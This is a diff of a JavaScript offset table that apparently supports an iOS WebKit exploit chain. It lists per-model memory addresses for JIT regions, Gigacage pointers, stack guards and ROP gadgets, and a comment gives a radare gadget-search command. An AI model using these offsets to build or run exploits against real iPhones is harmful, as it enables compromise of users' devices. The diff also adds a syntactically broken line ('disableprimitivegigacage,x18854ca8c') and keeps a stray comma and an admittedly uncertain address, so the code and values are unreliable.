@@ -3,7 +3,7 @@
     Use radare: "/c ldr x8, [sp, 0x28]; ldr x0, [x8, 0x18]; ldp x29, x30, [sp, 0x50]; add sp, sp, 0x60; ret"
 */
 
-var kOFFUnknown = 0xbaaaaaad;
+var kOFFUnknown = 0x0;
 
 //Class for finding offsets by software version and product name
 //This may have to be updated one day when offsets become specific between different models with the same product name
@@ -50,9 +50,9 @@ var Offsets = function Offsets(sw_vers, productname) {
         jit_writeseperateheaps_func: 0x1b2b990c8,
         usefastpermissions_jitcopy: 0x1b1620018,
         ptr_stack_check_guard: 0x1b2af3ef8,
-        modelio_popx8: 0,
-        coreaudio_popx2: 0,
-        linkcode_gadget: 0
+        modelio_popx8: kOFFUnknown,
+        coreaudio_popx2: kOFFUnknown,
+        linkcode_gadget: kOFFUnknown
     };
     
     //iPhone 5S
@@ -70,9 +70,9 @@ var Offsets = function Offsets(sw_vers, productname) {
         jit_writeseperateheaps_func: 0x1b31990c8,
         usefastpermissions_jitcopy: 0x1b1be8018,
         ptr_stack_check_guard: 0x1b30f1ef8,
-        modelio_popx8: 0,
-        coreaudio_popx2: 0,
-        linkcode_gadget: 0
+        modelio_popx8: kOFFUnknown,
+        coreaudio_popx2: kOFFUnknown,
+        linkcode_gadget: kOFFUnknown
     };
 
     //iPhone 6
@@ -90,9 +90,9 @@ var Offsets = function Offsets(sw_vers, productname) {
         jit_writeseperateheaps_func: 0x1b31a10c8,
         usefastpermissions_jitcopy: 0x1b1bf0018,
         ptr_stack_check_guard: 0x1b30f9ef8,
-        modelio_popx8: 0,
-        coreaudio_popx2: 0,
-        linkcode_gadget: 0
+        modelio_popx8: kOFFUnknown,
+        coreaudio_popx2: kOFFUnknown,
+        linkcode_gadget: kOFFUnknown
     };
     
     //iPhone 6+
@@ -101,9 +101,9 @@ var Offsets = function Offsets(sw_vers, productname) {
     offsets["iPhone 6+"][11.31] = {
         padding: 0x18,
         vtable: 0x189c9a808,
-        disableprimitivegigacage: 0,
+        disableprimitivegigacage: kOFFUnknown,
         callbacks: 0x1b319fd28,
-        g_gigacagebaseptrs: 0,
+        g_gigacagebaseptrs: kOFFUnknown,
         g_typedarraypoisons: 0x1b31a1720,
         longjmp: 0x180b126e8,
         dlsym: 0x18084ef90,
@@ -178,9 +178,9 @@ var Offsets = function Offsets(sw_vers, productname) {
         dlsym: 0x18084ef90,
         longjmp: 0x180b12778,
         callbacks: 0x1b335d698,
-        modelio_popx8: 0, 
-        coreaudio_popx2: 0,
-        linkcode_gadget: 0
+        modelio_popx8: kOFFUnknown, 
+        coreaudio_popx2: kOFFUnknown,
+        linkcode_gadget: kOFFUnknown
     };
     
     //iPhone 8
@@ -245,20 +245,37 @@ var Offsets = function Offsets(sw_vers, productname) {
         linkcode_gadget: 0x187bd18c8
     };
     
+    offsets["iPhone 6"][11.41] = {
+        vtable: kOFFUnknown,
+        disableprimitivegigacage: 0x18854aa90,
+        g_gigacagebaseptrs: 0x1b1d58000,
+        g_typedarraypoisons: 0x1b3311728,
+        startfixedmempool: 0x1b33110b8,
+        endfixedmempool: 0x1b33110c0,
+        jit_writeseperateheaps_func: 0x1b33110c8,
+        usefastpermissions_jitcopy: 0x1b1d54018,
+        ptr_stack_check_guard: 0x1b326bef8,
+        dlsym: 0x18084ef90,
+        longjmp: 0x180b12778,
+        callbacks: 0x1b33116a0,
+        modelio_popx8: kOFFUnknown,
+        linkcode_gadget: kOFFUnknown
+    };
+    
     offsets["iPhone 6S"][12.01] = {
         vtable: 0x1B1C95058,
         disableprimitivegigacage: 0x1881cbf54,
         g_gigacagebaseptrs: 0x1b80ec000,
-        g_typedarraypoisons: 0,
-        startfixedmempool: 0,
-        endfixedmempool: 0,
+        g_typedarraypoisons: kOFFUnknown,
+        startfixedmempool: kOFFUnknown,
+        endfixedmempool: kOFFUnknown,
         jit_writeseperateheaps_func: 0x1ba0610d0,
         usefastpermissions_jitcopy: 0x1b80f0018,
         ptr_stack_check_guard: 0x1b9fa9a18,
         dlsym: 0x180923d64,
         longjmp: 0x180adc598,
         callbacks: 0x1b80f01a8,
-        modelio_popx8: 0,
+        modelio_popx8: kOFFUnknown,
         linkcode_gadget: 0x188214890
     };
     
@@ -266,22 +283,22 @@ var Offsets = function Offsets(sw_vers, productname) {
         vtable: 0x23b419058, /*I got this for you*/,
         disableprimitivegigacage: 0x1881cbf54,
         g_gigacagebaseptrs: 0x1b80e4000,
-        g_typedarraypoisons: idk,
-        startfixedmempool: idk,
-        endfixedmempool: idk,
+        g_typedarraypoisons: kOFFUnknown,
+        startfixedmempool: kOFFUnknown,
+        endfixedmempool: kOFFUnknown,
         jit_writeseperateheaps_func: 0x1ba0590d0,
         usefastpermissions_jitcopy: 0x1b80e8018,
         ptr_stack_check_guard: 0x1b9fa1a18,
         dlsym: 0x180923d64,
         longjmp: 0x180adc630,
         callbacks: 0x1b80e81a8,
-        modelio_popx8: 0xffffffff76874000, /*This is modelio base in UFO finder idk if it is correct*/
-        linkcode_gadget: idk //Thanks to ivanhrabcak to finding these.
+        modelio_popx8: kOFFUnknown, /*This is modelio base in UFO finder idk if it is correct*/
+        linkcode_gadget: kOFFUnknown //Thanks to ivanhrabcak to finding these.
     };
 
     offsets["iPhone 7"][12.01] = {
         vtable: kOFFUnknown,
-        disableprimitivegigacage: 0x18854ca8c,
+        disableprimitivegigacage,x18854ca8c,
         g_gigacagebaseptrs: 0x1b1f64000,
         g_typedarraypoisons: 0x1b35c9728,
         startfixedmempool: 0x1b35c90b8,
